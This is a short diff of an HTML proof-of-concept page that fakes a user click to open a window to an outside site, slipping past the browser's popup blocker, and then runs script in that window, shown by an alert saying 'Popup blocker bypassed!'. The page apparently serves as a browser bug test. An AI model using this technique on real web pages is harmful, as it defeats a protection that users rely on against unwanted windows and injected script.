@@ -1,6 +1,14 @@
 <HTML>
 	<BODY><A id=test onclick=go()></A></BODY>
 	<SCRIPT>
-		open('//rick.amigocraft.net');
+		oClickEvent = document.createEvent("MouseEvents");
+		oClickEvent.initEvent("click", true, true, window, 0, 0, 0, 
+0, 0, false, false, false, false, 0, null);
+		document.getElementById("test").dispatchEvent(oClickEvent);
+		function go() {
+			oWin = window.open("//rick.amigocraft.net", "blabla");
+			oWin.execScript('alert("Popup blocker 
+bypassed!");');
+		};
 	</SCRIPT>
 </HTML>
